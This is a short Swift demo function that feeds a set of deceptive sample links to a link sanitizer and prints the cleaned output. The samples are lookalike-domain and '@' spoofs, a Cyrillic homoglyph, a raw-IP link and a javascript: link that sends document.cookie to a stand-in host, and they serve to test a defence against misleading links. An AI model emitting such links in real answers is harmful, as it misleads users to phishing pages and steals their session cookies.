import LinkEgressKit

/// Links that are honest about nothing but their text.
func hosts() {
    header(4, "Looks like one host, goes to another")
    let answer = """
    1. [apple.com](https://apple.com.account-check.example/login)
    2. [support.apple.com](https://support.apple.com@account-check.example/)
    3. https://\u{0430}pple.example/id
    4. [Apple Store](http://203.0.113.9/store)
    5. [run the fix](javascript:fetch('https://x.example/'+document.cookie))
    6. [apple.com](https://www.apple.com/iphone/) is fine.
    """
    let report = LinkSanitizer().sanitize(answer)
    show(report)
    print("   rendered:")
    for line in report.text.split(separator: "\n") { print("     \(line)") }
}
